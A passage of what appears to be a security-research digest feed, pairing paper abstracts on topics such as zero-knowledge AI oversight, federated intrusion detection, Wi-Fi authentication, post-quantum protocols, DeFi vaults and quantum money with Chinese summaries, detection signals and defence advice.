llm_summary.recommended_action_zh: 研究跟进：复现其良性动力学建模思路，评估在自有扩散模型与内部数据集上的检测率与误报率，判断是否纳入模型上线前安全评测基线。

items.title: Can AI Oversight Be Zero Knowledge?
items.summary: AI systems increasingly produce outputs from confidential data, such as a fitness-for-duty assessment from medical records or the predicted properties of a drug candidate from its secret structure. It is important to verify that such outputs are correct without revealing the underlying data. A recent line of work studies verification of AI outputs via interactive proofs and debate for oracle-aided computation, where correctness may depend on an oracle such as human judgment, a physical experiment, or the web. These works focus on verification by a verifier that runs much faster than the computation. However, such efficient verification is impossible for general oracle-aided computation, and these works therefore rely on additional assumptions. We focus instead on privacy: allowing the verifier to run in time polynomial in the computation, we ask whether interactive arguments for oracle-aided computation can be zero knowledge, so that the verifier learns nothing about the confidential data beyond the correctness of the output. We prove that, in general, they cannot. In the random oracle model, there are no zero-knowledge proofs for all oracle-aided computations, even if both the prover and the verifier are allowed to run much longer than the computation itself. The impossibility extends to debate, a canonical model for scalable oversight. On the positive side, we show that if the oracle attaches a cryptographic signature to each of its answers, then every oracle-aided computation can be verified in zero knowledge with an efficient prover and verifier, assuming only collision-resistant hash functions. Beyond privacy, this also gives an alternative approach to scalable oversight that relies neither on an honest opponent, as in debate, nor on the robustness of the computation, as in prior single-prover protocols.

llm_summary.summary_zh: 该论文研究的是"AI 输出验证"与"数据隐私"之间的张力：AI 系统越来越多地基于机密数据产生输出，例如依据医疗记录给出适岗性评估，或依据未公开的分子结构预测候选药物性质。人们既想确认这类输出正确，又不愿暴露底层机密数据。近期一系列工作借助交互式证明与"辩论（debate）"机制来验证带预言机（oracle）辅助的计算，这里的预言机可以是人类判断、物理实验或互联网检索；但这类研究关注的是验证者运行时间远快于计算本身的高效验证，而一般性的预言机辅助计算不可能实现如此高效的验证，因此它们不得不依赖额外假设。本文转而关注隐私维度：允许验证者的运行时间为计算的多项式级（即不再追求亚线性高效验证），追问带预言机辅助计算的交互论证能否做到零知识，使验证者除"输出是否正确"之外学不到任何关于机密数据的信息。作者证明，一般情况下这是不可能的：在随机预言机模型中，不存在覆盖所有预言机辅助计算的零知识证明，即便证明者与验证者都被允许运行远超计算本身的时间；该不可能性结论同样适用于 debate 这一可扩展监督（scalable oversight）的典范模型。在正面方向上，作者给出构造：若预言机对每个回答附带密码学签名，则任何预言机辅助计算都能以零知识方式被验证，且证明者与验证者保持高效，所需假设仅为抗碰撞哈希函数。除隐私之外，这一结果还提供了可扩展监督的一条新路径，它既不依赖 debate 所假设的"诚实对手"，也不依赖以往单证明者协议所要求的计算鲁棒性。论文属理论密码学与 AI 监督的交叉基础研究，适合关注 AI 可验证性、机密数据推理审计与可扩展监督机制的研究者和工程人员阅读。
llm_summary.why_it_matters_zh: 它为"可验证 AI 输出且不泄露输入数据"这一安全诉求划定了理论边界：通用零知识验证在随机预言机模型下不可能成立，除非预言机对回答签名。这直接影响机密数据 AI 审计与监督机制的安全假设设计。
llm_summary.impact_zh: 可迁移到医疗记录、药物研发等敏感数据上的 AI 推理审计；对辩论式/可扩展监督框架的隐私性评估；以及对声称提供零知识保证的 AI 验证服务的安全模型审查。
defense_advice_zh: 在设计机密数据 AI 审计或监督流程时，不要默认通用的零知识交互证明可行，应明确所依赖的预言机假设与安全模型。
若需要零知识地验证预言机辅助计算，优先考虑要求预言机对回答附加密码学签名，并仅依赖抗碰撞哈希函数构建协议。
对第三方宣称具备零知识保证的 AI 输出验证/监督方案，要求其披露预言机模型，并核对是否落入论文所述的不可能性范围。
llm_summary.recommended_action_zh: 研究跟进

items.title: Cybersecurity in Edge Computing: A Trust-Aware Federated Hybrid Intrusion Detection Framework
items.summary: Edge computing has emerged as a critical computing paradigm in modern distributed systems by migrating data processing closer to end users and Internet of Things (IoT) devices. While this paradigm decentralizes processes, minimizes latency, and reduces backhaul bandwidth congestion, it exponentially enlarges the cyberattack surface. Heterogeneous, resource-constrained edge devices deployed across unmanaged administrative domains present highly vulnerable targets. To address these vulnerabilities without compromising global data privacy regulations, this paper proposes a novel Trust-Aware Federated Hybrid Intrusion Detection Framework (TA-FHIDF). The proposed framework integrates an Autoencoder, a 1D Convolutional Neural Network (1D-CNN), and a Bidirectional Long Short-Term Memory (BiLSTM) model into a unified, localized deep learning engine capable of autonomous spatial and temporal feature extraction. Model training is performed collaboratively via federated learning, ensuring raw network telemetry remains isolated at local gateways. Furthermore, to defend against adversarial model poisoning attacks, we introduce a robust server-side trust-aware aggregation mechanism that evaluates client reliability using a cosine similarity metric before global model integration. Empirical evaluations across multi-vector benchmark datasets (UNSW-NB15, CICIDS2017, and Edge-IIoTset) demonstrate the framework's superior detection accuracy, rapid convergence, and high Byzantine fault tolerance under adversarial attack scenarios.

llm_summary.summary_zh: 边缘计算把数据处理下沉到靠近终端用户与 IoT 设备的位置，虽然降低了时延、缓解了回传带宽压力，却显著扩大了攻击面：异构、资源受限的边缘设备往往部署在非受控管理域中，极易成为攻击目标。同时，集中式训练入侵检测模型会触及原始网络流量的隐私与合规问题。为在满足数据本地化与隐私法规的前提下提升检测能力，本文提出信任感知联邦混合入侵检测框架（TA-FHIDF）。该框架在本地网关侧构建统一的深度学习引擎，融合自编码器（Autoencoder）、一维卷积神经网络（1D-CNN）与双向长短期记忆网络（BiLSTM）：自编码器用于特征压缩与异常重构，1D-CNN 提取空间维度上的局部流量模式，BiLSTM 则捕获长距离时序依赖，从而在边缘侧完成自治的时空特征提取。训练过程采用联邦学习协同进行，原始网络遥测数据始终保留在本地网关，只上传模型更新，避免集中汇聚原始流量。针对联邦学习自身面临的对抗性模型投毒风险，作者引入服务器端信任感知聚合机制：在将客户端更新纳入全局模型之前，使用余弦相似度度量各客户端更新的方向一致性，据此评估客户端可靠性并抑制恶意或异常更新。实验在 UNSW-NB15、CICIDS2017 与 Edge-IIoTset 三个多向量基准数据集上开展，结果显示该框架在检测准确率、收敛速度以及对抗场景下的拜占庭容错能力方面均表现优越。该工作面向边缘计算与联邦学习交叉场景，适合从事边缘安全、IoT 入侵检测、隐私保护机器学习与联邦学习鲁棒性研究的工程师与研究人员阅读。
llm_summary.why_it_matters_zh: 边缘设备暴露面大且数据不可集中，本文给出可落地的联邦混合检测与信任聚合思路，对构建隐私合规的边缘 IDS 与抵御联邦投毒具有直接参考价值。
llm_summary.impact_zh: 可迁移至工业物联网、智慧城市、车联网、分布式分支机构等边缘节点入侵检测场景，也可为联邦学习平台提供基于余弦相似度的恶意客户端过滤组件。
detection_signals_zh: 联邦聚合轮次中个别客户端的模型更新方向与多数客户端显著偏离，余弦相似度持续偏低
全局模型在聚合后出现准确率骤降或损失突增，且与特定客户端参与轮次高度相关
本地网关上报的更新向量分布出现突变（范数异常、梯度方向反转或高频震荡）
边缘节点流量在攻击窗口内呈现与训练集已知攻击族不同的时空特征组合，触发自编码器重构误差升高
defense_advice_zh: 在边缘网关部署本地轻量级检测引擎，将原始流量留在本地，仅上传模型更新以符合隐私法规
对联邦聚合引入信任评估与余弦相似度过滤，剔除方向异常或低可信的客户端更新
持续监控全局模型在聚合前后的性能变化，将突降作为潜在投毒告警并回滚到上一可信版本
使用 UNSW-NB15、CICIDS2017、Edge-IIoTset 等多向量数据集定期回归评测，覆盖已知与新型攻击组合
对参与联邦的边缘节点做身份与完整性校验，限制未授权节点加入聚合过程

items.title: Protocol Integration of Physical Layer Deception into EAP-TEAP Wi-Fi Authentication
items.summary: Credential-based Extensible Authentication Protocol (EAP) authentication cannot distinguish a legitimate credential holder from an adversary using compromised credentials. Physical Layer Deception (PLD) complements credential-based authentication by exposing a deceptive primary object over a primary transport while a separate recovery object travels with differentiated reliability over a secondary channel. Existing PLD studies remain, to our knowledge, at the physical/link-model level; using PLD's activation/deactivation mechanism as an authentication gate creates an authentication-specific design requirement, since an all-inactive attempt would exercise no recovery path. We present a batched PLD-based re-verification step for Enterprise Wi-Fi's TEAP/RADIUS/IEEE 802.11 authentication chain, implemented end to end across the server, access point, and device in the open-source hostap 2.12 codebase. Each attempt carries three rounds, at least one active, with no dedicated activation flag. Across four campaigns totaling 1593 attempts, the prototype evaluates batched recovery behavior, rejects the implemented naive credential-bearing attacker in all 30 attempts, measures successful-path latency, and evaluates the security-reliability trade-off for one, two, and three active rounds under two modeled recovery regimes. The evaluation exercises the protocol and software-MAC behavior directly and analyzes informed and retry-seeking attackers under the software recovery model.

llm_summary.summary_zh: 这篇论文关注企业级 Wi-Fi 认证中的一个根本性缺陷：基于凭据的 EAP 认证（如 TEAP）只能验证凭据本身是否正确，无法区分「合法凭据持有者」与「通过窃取、泄露或共享获得凭据的攻击者」——只要凭据匹配，认证就会成功。物理层欺骗（Physical Layer Deception, PLD）被视为一种互补手段：在主要传输通道上暴露一个「欺骗性主对象」，而真正用于恢复的「恢复对象」则通过具备差异化可靠性的第二通道传输，使只有掌握正确物理层条件的合法设备才能恢复出该对象。作者指出，此前 PLD 研究基本停留在物理层与链路模型层面，尚未与真实认证协议栈集成；而把 PLD 的激活/去激活机制直接当作认证门控，会引入一个认证特有的设计约束：如果一次尝试中所有 PLD 都处于非激活状态，就不会有任何恢复路径被使用，等于给攻击者留下可规避的空档。为此，论文提出一种「批量（batched）」PLD 再验证步骤，嵌入企业 Wi-Fi 的 TEAP/RADIUS/IEEE 802.11 认证链，并在开源 hostap 2.12 代码库中完成服务器、接入点、终端设备三端的端到端实现。每次认证尝试包含三轮 PLD 过程，其中至少一轮处于激活状态，且不设置专用的激活标志位，以避免依赖可被识别或滥用的显式标识。实验评估覆盖四个实验组、共 1593 次尝试，内容包括：批量恢复行为的观察、对所实现的「朴素凭据携带型攻击者」的拒绝效果（30 次尝试全部拒绝）、成功认证路径的时延测量，以及在两种建模恢复机制下、一至三轮激活配置时安全性与可靠性之间的权衡分析。评估直接检验了协议行为与软件 MAC 层表现，并进一步分析了知情攻击者与重试型攻击者在软件恢复模型下的行为。该工作适合从事企业无线认证、RADIUS/802.1X 部署以及物理层安全研究的工程师与研究人员阅读。
llm_summary.why_it_matters_zh: 企业 Wi-Fi 普遍依赖凭据认证，凭据泄露即等于认证失效。该工作首次把物理层欺骗作为「第二因素」嵌入 TEAP/RADIUS/802.11 实链，验证了拒绝凭据型攻击者的可行性，并给出可用性与安全性的量化权衡，对无线接入架构与认证加固方向有直接参考价值。
llm_summary.impact_zh: 可迁移到企业 802.1X/TEAP 无线接入、高安全场景（园区网、工业无线、涉密环境）的二次认证与反凭据滥用；也可为接入点/控制器厂商在软件 MAC 层实现认证门控提供设计参考，并影响对重试型攻击的检测策略设计。
detection_signals_zh: 单次 TEAP 认证会话中出现多轮 PLD 过程且全部处于非激活状态，缺失有效恢复路径
同一身份或同一凭据在短时间内高频触发认证重试与批量再验证失败（重试型攻击特征）
RADIUS 侧同一用户名/证书出现异常多的并行或串行 EAP 会话，且失败集中在恢复阶段而非凭据校验阶段
成功认证路径时延分布异常，存在与 PLD 轮次相关的固定延迟模式变化
同一凭据在物理层恢复质量指标上呈现与正常终端不一致的分布（软件恢复模型下的模拟/伪造特征）
defense_advice_zh: 在评估引入 PLD 门控前，先量化误拒率与成功路径时延开销，避免对合法终端造成可用性风险
为 PLD 轮次全非激活或恢复失败配置独立的告警与审计事件，而不是仅记录为普通认证失败
对同一身份的认证重试频率设置限速与告警阈值，以覆盖重试型攻击者
将 PLD 视为凭据之外的第二因素而非替代品，保留凭据轮换、证书绑定、设备合规性检查等既有控制
在测试环境复现前先确认 hostap 版本与软/硬件 MAC 卸载能力，避免在无相应能力的接入点上误判行为
llm_summary.recommended_action_zh: 研究跟进

items.title: Evidence Coverage for Intent-Bound Execution: Scope, Obligations, and Cutoff Reasoning
items.summary: A verifier may authenticate every available record and still lack grounds to call an execution account complete. Such a claim requires a justified account of which records were due for the execution being assessed. We present an analytical model for retrospective coverage of declared execution-evidence obligations. Its scope binds a structured Intent, an exact Candidate, a selected analytical attempt, an execution and evidence boundary, a stage horizon, a fixed record-obligation profile, a named verifier, and an assessment cutoff. Branch and trigger premises determine obligation instances; source competence, content, integrity, and object and stage bindings determine admissibility. We distinguish closure of the obligation inventory from closure of the relevant verifier view, and define three reporting results: COMPLETE_WITHIN_SCOPE, INCOMPLETE, and UNKNOWN. These results concern current coverage of obligations due at the cutoff. Execution progress, external outcome knowledge, and historical delivery timeliness are reported separately. Constructed service-principal-disablement cases demonstrate complete dispatch and refusal branches, a due but missing final-result record, subsequent coverage after late delivery, and the limits of extending one selected attempt's coverage to all attempts. The contribution is an execution-specific composition of scope, branch, horizon, obligations, admissibility, view, and cutoff. Completeness remains conditional on the declared profile and assessment premises.

llm_summary.summary_zh: 论文关注一个被普遍忽视的取证与审计断点：验证者可能已逐一认证了所有“可得”记录，却依然没有依据宣称某次执行的账目是“完整”的。要做出完整性断言，必须首先论证哪些记录对于被评估的这次执行是“应当存在”的。为此作者提出一个用于对“已声明的执行证据义务”进行追溯性覆盖度评估的分析模型。该模型的作用域（scope）把八类要素绑定在一起：结构化的意图（Intent）、精确的候选对象（Candidate）、选定的某次分析尝试、执行与证据的边界、阶段视野（stage horizon）、固定的记录义务档案（record-obligation profile）、具名的验证者，以及评估截点（cutoff）。模型用“分支与触发前提”来确定具体产生了哪些义务实例；再用来源胜任性、内容、完整性，以及对象与阶段绑定，来判定某条记录是否可采（admissibility）。作者特别区分了两种闭合：义务清单在清单层面的闭合，与针对特定验证者相关视图的闭合，二者并不等价。据此定义三种报告结果：COMPLETE_WITHIN_SCOPE（在作用域内完整）、INCOMPLETE（不完整）、UNKNOWN（未知），它们仅针对截点时刻已经“应尽”的义务的当前覆盖状况发言。执行进度、外部结果知识、以及历史交付是否及时，均作为独立维度单独报告，不与完整性结论混同。论文用构造的“服务主体被禁用”（service-principal-disablement）案例进行演示，覆盖了完整的派发与拒绝分支、一条“应到但缺失”的最终结果记录、迟交付之后的后续覆盖变化，以及把某一次选定尝试的覆盖结论外推到全部尝试时所暴露的局限。其核心贡献是把作用域、分支、视野、义务、可采性、视图与截点，按“执行特定”的方式组合成一个可分析的结构；并且强调完整性始终是条件性的，取决于所声明的义务档案与评估前提，而非绝对的客观属性。
llm_summary.why_it_matters_zh: 它直面审计与取证中的经典误判——把“所有可得记录都验过”当成“账目完整”。对日志审计、事件复盘与合规取证而言，这种区分义务应到与实到、并显式标注 UNKNOWN 的推理框架，能显著降低过度断言带来的风险。
llm_summary.impact_zh: 可迁移到安全审计与取证重建、SOC 事件闭环判定、审计日志/证据完整性评估、供应链与工单的责任追溯，以及任何以“执行账目”为对象的合规核查场景；也可为自动化审计工具设计完整性判定接口时提供语义参考。
detection_signals_zh: 被声明应到但缺失的最终结果记录（due but missing）
迟交付发生后覆盖结论由不完整转为完整的时间点变化
单次分析尝试的覆盖被外推到全部尝试的越界结论
义务清单闭合与验证者视图闭合不一致的告警
defense_advice_zh: 先固化 Intent、候选对象与记录义务档案，再开展证据完整性判定，避免无基准的“看起来完整”结论
明确评估截点，只对截点时刻应尽的义务做完整性结论
将执行进度、外部结果知识与交付及时性作为独立指标报告，不与完整性混谈
区分义务清单闭合与特定验证者视图闭合，必要时输出 UNKNOWN 而非默认完整
禁止把单次尝试的覆盖结论直接外推到全部尝试
llm_summary.recommended_action_zh: 研究跟进

items.title: Verifiable Quantum Advantage and Computation via Quantum Circuit Obfuscation
items.summary: We construct protocols for classically verifiable quantum advantage and classical verification of $\mathsf{BQP}$ computations using \emph{quantum indistinguishability obfuscation} (qiO). Specifically, given qiO and assuming a slightly stronger version of $\mathsf{BQP}\neq\mathsf{BPP}$, we construct a two-message quantum-advantage protocol that is efficiently and publicly verifiable. Our result can be viewed as a rigorous cryptographic foundation for the heuristic quantum advantage proposals based on \emph{peaked random circuit sampling} of Aaronson and Zhang (arXiv:2404.14493). We also construct two simple protocols for classically verifying arbitrary $\mathsf{BQP}$ computations. The first protocol is privately verifiable and assumes only the existence of qiO. This gives a rare example of a nontrivial cryptographic application of (quantum) iO that does not make additional computational hardness assumptions. The second protocol additionally assumes post-quantum one-way functions and is \emph{publicly verifiable}. To our knowledge, this is the first publicly verifiable protocol for classical verification of $\mathsf{BQP}$ computations under computational assumptions in the standard model. We show that all our results hold when qiO is assumed only for ancilla-free unitary circuits. As evidence supporting this assumption, we prove a worst-to-average-case reduction for obfuscating such circuits. This reduction extends the local-mixing framework of Canetti, Chamon, Mucciolo and Ruckenstein (TCC 2024) under quantum analogues of their assumptions.

llm_summary.summary_zh: 该论文研究如何在经典世界中对量子计算的优势与正确性进行可验证，核心工具是量子不可区分混淆（quantum indistinguishability obfuscation, qiO）。作者首先在假设 qiO 存在、并假设一个比 BQP≠BPP 略强的分离性假设的前提下，构造了一个两消息（two-message）的量子优势协议，该协议可以被高效且公开地验证。这一结果被视为对 Aaronson 与 Zhang（arXiv:2404.14493）提出的、基于峰值随机电路采样（peaked random circuit sampling）的启发式量子优势方案的严格密码学基础：把过去依赖经验性论证的『量子设备确实做了经典难以模拟的事』转化为具备可证明安全性的交互协议。其次，论文给出两个用于经典验证任意 BQP 计算的简洁协议。第一个协议是私有可验证（privately verifiable）的，仅假设 qiO 存在，不需要任何额外的计算困难性假设，这在（量子）iO 的应用史上是较为罕见的非平凡密码学落地；第二个协议在此基础上额外假设后量子单向函数，从而实现公开可验证（publicly verifiable）。据作者所述，这是标准模型下基于计算假设、首个可公开验证 BQP 计算的协议。第三，作者证明上述全部结论在 qiO 仅对无辅助比特（ancilla-free）酉电路成立这一更弱假设下依然成立，并为此类电路的混淆给出了最坏情况到平均情况（worst-to-average-case）的归约，作为支持该假设的证据。该归约在量子版本的相应假设下扩展了 Canetti、Chamon、Mucciolo 与 Ruckenstein（TCC 2024）提出的局部混合（local-mixing）框架。整体而言，这是一篇理论密码学 / 量子计算交叉方向的工作，意义在于为『量子优势』与『BQP 经典验证』提供可证明的信任根基，并弱化了实现这些目标所需的假设强度。
llm_summary.why_it_matters_zh: 它为『量子优势』声明和 BQP 计算结果的经典验证提供了可证明的密码学基础，使云量子计算服务的可信验证、以及混淆类密码协议的设计有了更明确的假设边界，值得量子安全与密码学团队跟踪。
llm_summary.impact_zh: 可迁移至量子云计算服务的算力真实性验证、可验证量子计算外包、后量子密码与混淆密码原语的设计评估，以及对现有『量子优势』实验声明的可信度评估框架。
defense_advice_zh: 本工作为理论密码学成果，暂无直接可部署的检测或防御措施；建议由密码学与量子安全团队纳入技术跟踪清单。
在评估量子云服务商或后量子迁移路线图时，可参考其关于可验证性与所依赖假设的分层结论，避免过度依赖未经证明的启发式论证。
llm_summary.recommended_action_zh: 研究跟进

items.title: Natural Barriers to Quantum Extraction: On the Post-Quantum (In)security of (O)EKE and Masny-Rindal OT
items.summary: Encrypted key exchange (EKE), introduced by Bellovin and Merritt (IEEE S\&P 1992), and Masny-Rindal OT, introduced by Masny and Rindal (ACM CCS 2019), are highly-efficient methods for compiling essentially any KEM into advanced cryptographic protocols, namely password-authenticated key exchange (PAKE) and oblivious transfer (OT), by relying only on idealized symmetric-key primitives. They have become leading candidates for practically-implementable PAKE and OT due to (1) their simplicity, (2) their plug-and-play nature, allowing for flexibility in the choice of KEM, and (3) existing proofs of UC-security (in the classical adversarial model). Due to point (2) above, these compilers yield attractive candidates for efficient \emph{post-quantum} PAKE and OT, especially given the recent post-quantum KEM standardization efforts. This motivates the question of whether the (UC-)security of these compilers translates to the quantum adversarial model. In this work, we show that it does not. In particular, we prove that a general family of (O)EKE protocols, as well as Masny-Rindal OT, are \emph{not} UC-secure against quantum polynomial-time adversaries, even when instantiated with a post-quantum KEM. To establish UC-insecurity, we devise an adversarial strategy that provably thwarts any attempt by the simulator to extract its input (the password in the case of PAKE, and the receiver's choice bit in the case of OT). To complement these negative results, we establish that both compilers yield certain notions of \emph{game-based} security. Along the way, we establish a novel ``advantage-tight'' one-way to hiding lemma that may be of independent interest.

llm_summary.summary_zh: 该论文研究后量子时代下两类高效密码编译器的安全性：Bellovin 与 Merritt 于 1992 年提出的加密密钥交换（EKE），以及 Masny 与 Rindal 于 2019 年提出的 OT 编译器。它们仅依赖理想化对称密钥原语，就能把几乎任意 KEM 编译成高级密码协议，即口令认证密钥交换（PAKE）和不经意传输（OT）。由于构造简单、即插即用、允许灵活选择 KEM，并且已有经典敌手模型下的 UC-安全证明，它们成为可实用化 PAKE 和 OT 的主要候选。随着后量子 KEM 标准化推进，一个自然问题是：这些编译器的 UC-安全性是否能迁移到量子敌手模型？作者证明不能。具体而言，一般族系的 (O)EKE 协议以及 Masny-Rindal OT 在量子多项式时间敌手下不具备 UC-安全性，即使底层使用后量子 KEM 也一样。为证明 UC-不安全，作者构造了一种对抗策略，可证明地阻止模拟器提取其输入：PAKE 场景下是口令，OT 场景下是接收方的选择比特。作为补充，作者证明这两个编译器仍能达到某些基于游戏的（game-based）安全性概念。过程中还建立了一个新的“优势紧致”的 one-way to hiding 引理，可能具有独立价值。该工作适合后量子密码协议设计者、PAKE/OT 标准化参与者以及 UC-安全理论研究者阅读，提醒不要仅凭经典 UC 证明就推断后量子部署安全。
llm_summary.why_it_matters_zh: 后量子 PAKE/OT 很可能被用于实际协议与标准。该文证明经典 UC 安全证明不能自动迁移到量子敌手，即使使用后量子 KEM 也可能存在 UC 不安全问题，因此对后量子迁移和标准评估具有直接影响。
llm_summary.impact_zh: 影响基于 KEM 编译的 PAKE、OT 及其上层组合协议，尤其是在后量子迁移、标准化选型和 UC-安全组合场景中。设计者若仅依赖经典 UC 证明，可能高估协议在后量子环境下的安全性。
defense_advice_zh: 协议设计者不应默认经典 UC-安全证明可迁移到量子敌手模型，需明确要求量子 UC 安全证明或选用有量子安全论证的替代构造。
在后量子 PAKE/OT 标准评估中，将量子 UC 安全性纳入审查清单，而不仅检查底层 KEM 是否后量子安全。
若只能获得基于游戏的安全性，应评估其是否满足实际部署所需的组合与并发安全要求。
llm_summary.recommended_action_zh: 研究跟进

items.title: Breaking the Bounded Entanglement Barrier for Quantum Position Verification
items.summary: Position verification, introduced by Chandran et al. (SIAM J. Computing 2014), allows verifiers to test a prover's claimed position by an interactive protocol. Classical position verification is impossible. Even for Quantum Position Verification (QPV), there always exists an LOCC (Local Operations and Classical Communication) attack if the adversary can hold an exponentially large amount of preshared entanglement. Somewhat surprisingly, we show that we can circumvent this barrier in the idealized continuous-time model, where time is represented by a real-valued parameter and challenge messages can be sent at a time sampled uniformly from a real interval. In this model, we give a BB84-based protocol that remains secure against any finite coalition of LOCC adversaries with arbitrary finite (possibly exponential) quantum storage and entanglement. Our construction can also be instantiated in the discrete-time model. Even though the previous impossibility results apply, we are able to obtain an information-theoretic QPV protocol in which the honest parties' total resources (communication and storage) can be significantly smaller than the adversarial resource bound. In fact, we can achieve any desired polynomial gap between honest parties and adversarial resources. To our knowledge, all previous protocols in the literature required resources of the honest parties to be at least as large as the adversarial entanglement. Interestingly, the resource gap between the honest and adversarial party resources in our protocol depends on how precisely time can be measured. As the precision of the best-known clock improves with further research, the resource gap in our protocol keeps increasing. In particular, the adversarial resource bound keeps increasing while the honest parties' resources remain largely the same. We call this the "I sleep, you work" paradigm.

llm_summary.summary_zh: 本文研究量子位置验证（Quantum Position Verification, QPV）中的资源下界问题。位置验证由 Chandran 等人于 2014 年提出，允许验证者通过交互协议检验证明者所声称的地理或网络位置。经典位置验证已被证明不可能实现；而在量子情形下，攻击者若预先共享指数级规模的纠缠，则总能实施 LOCC（本地操作与经典通信）攻击，这被称为有界纠缠壁垒。作者在理想化连续时间模型中绕开了该壁垒：该模型将时间刻画为实值参数，挑战消息的发送时刻从一个实数区间内均匀采样。在此模型下，他们给出一个基于 BB84 的协议，能够抵抗任意有限个 LOCC 攻击者组成的联盟，且攻击者可拥有任意有限的（甚至是指数级的）量子存储与纠缠。该构造也可实例化到离散时间模型中。尽管此前的不可能性结论仍然成立，作者仍得到信息论安全的 QPV 协议，其中诚实方的总资源（通信与存储）可以显著小于攻击方的资源上界，甚至可实现任意期望的多项式级资源差距。据作者所知，此前文献中的协议都要求诚实方资源至少与攻击者纠缠量相当。特别地，本协议中诚实方与攻击方的资源差距取决于时间测量精度：随着更优时钟的研究进展，精度提升会使攻击方资源上界不断增大，而诚实方资源基本不变，作者称之为“我睡你干”（I sleep, you work）范式。
llm_summary.why_it_matters_zh: 该工作挑战了 QPV 领域长期存在的“诚实方资源必须不低于攻击者纠缠”的直觉，提出仅依赖时间采样精度即可拉开资源差距的新范式，对未来基于位置的安全协议与量子网络设计有理论指导意义。
llm_summary.impact_zh: 主要影响量子密码协议设计与位置验证的理论安全边界；对依赖高精度时间同步的量子密钥分发、距离绑定（distance-bounding）协议及基于位置访问控制的安全假设有潜在迁移价值。

items.title: A Systematization of Knowledge on DeFi Vaults: Architectures, Curation Mechanisms, and Strategy Design
items.summary: Decentralized finance (DeFi) vaults are smart-contract-based asset management systems that pool deposits, execute programmable strategies, and mint tokenized shares representing claims on underlying assets and strategy performance. As vault designs have evolved from early yield aggregators to modular, actively managed systems, a new control layer, curation, has emerged to select strategies, configure risk parameters, and coordinate operational execution, introducing principal-agent dynamics and new failure modes. This paper systematizes DeFi vault architectures and curator-mediated control planes through (i) a unified system model and formal definitions for share accounting, roles, and operational dependencies, and (ii) three complementary taxonomies covering vault exposures and objectives, curator governance and accountability mechanisms, and strategy execution patterns together with their failure modes. We further map a representative set of production protocols to the proposed dimensions. The frameworks in this work aim to support rigorous analysis and safer design of blockchain-based financial applications.

llm_summary.summary_zh:
本文是一篇关于去中心化金融（DeFi）金库（Vault）的系统化知识综述（SoK），作者为 Davide Mancino 与 Luca Pennella，归类于 cs.CE 与 cs.CY。DeFi 金库是一类基于智能合约的资产管理系统：它汇集用户存款、执行可编程策略，并铸造代表对底层资产及策略收益索取权的代币化份额。论文指出，随着金库设计从早期的收益聚合器（yield aggregator）演进为模块化、主动管理的系统，出现了一个新的控制层——策展（curation），负责策略选择、风险参数配置与运营执行协调，由此引入委托-代理（principal-agent）动态关系与新型失效模式。

论文的核心工作由两条主线构成。第一，提出统一的系统模型与形式化定义，覆盖份额记账（share accounting）、角色划分与运营依赖关系，使不同金库实现的语义可以在同一坐标系下比较。第二，构建三套互补的分类法：一是金库的风险敞口与目标分类；二是策展人的治理与问责机制分类；三是策略执行模式及其对应的失效模式分类。作者进一步将一批具有代表性的生产环境协议映射到上述维度上，用以验证框架的覆盖度与区分能力。

论文定位为分析框架而非漏洞披露或攻击技术说明，其目标是支撑对基于区块链的金融应用进行严谨分析与更安全的设计。适合读者包括 DeFi 协议审计人员、智能合约安全研究者和链上风险管理人员，尤其是需要理解金库中策展层这一新兴信任假设的从业者。摘要未给出量化实验或数据集评测结果，主要贡献在于概念统一、术语规范与分类体系。
llm_summary.why_it_matters_zh: 金库是 DeFi 中聚集大量用户资金的核心组件，其新增的策展层引入了中心化的委托-代理信任假设与新失效模式。该文提供的统一模型与分类法，可帮助安全团队在审计与风险评估中系统性地枚举角色权限、份额记账与策略执行风险，而非依赖零散经验。
llm_summary.impact_zh: 可迁移至 DeFi 协议审计清单设计、链上风险监控规则建模、金库角色的权限最小化评审，以及内部对第三方收益聚合产品（如 ERC-4626 类金库）的准入评估。
detection_signals_zh: 金库策展人/管理者角色地址发生变更或新增权限
风险参数（抵押率、额度上限、清算阈值）在短时间内被调整
策略目标合约或执行路径被替换、迁移至新地址
金库份额价格与底层资产净值出现异常偏离（如大额直接转账影响份额估值）
提现、存款在同一区块内大额往返，伴随份额铸造或销毁异常
defense_advice_zh: 将论文提出的角色、份额记账与运营依赖维度纳入金库安全审计清单
对金库策展人权限实施最小化与多签/时间锁约束，并对权限变更建立告警
持续监控策略切换、参数调整与份额价格偏离，作为链上异常检测规则
在引入第三方金库产品前，按策展治理与问责机制维度做准入尽调
llm_summary.recommended_action_zh: 研究跟进

items.title: Path-Finding, Orbit State Preparation, and the Security of Invariant Quantum Money
items.summary: The security of quantum money from knots, and of its generalization to invariant money, is based on the assumption that path-finding, exhibiting a sequence of moves between two equivalent objects, is hard. No proof of security from that assumption alone is known. The existing proofs add knowledge-of-path assumptions, which assert that any efficient algorithm producing two objects with the same invariant implicitly knows a path between them. No attack can refute such an assumption, and it is not known to follow from security. We ask when path-finding is the right assumption. When each equivalence class is the orbit of an efficiently computable action of a group that can be superposed over, and every move acts as a group element, as for graphs, average-case hardness of path-finding is necessary for security. For knots no such group is known, and a path-finder only reduces forgery to an equally hard state-preparation problem. With or without a path-finder, a forger must prepare a state that verification accepts, and we take the hardness of that task as the assumption. For schemes whose verification walk mixes in polynomial time, the preparation assumption states that no efficient algorithm, given the serial number of a freshly minted banknote and one object measured from it, prepares such a state. It is falsifiable, and it is equivalent to security against forgers that measure their banknote first. The transfer assumption, which security implies, states that measuring first costs a forger at most a polynomial factor. Together the two are equivalent to security, so every proof of security must establish the preparation assumption. If the preparation assumption holds, no fully black-box reduction that calls the forger only at the serial number it is given can derive the transfer assumption from the preparation assumption.

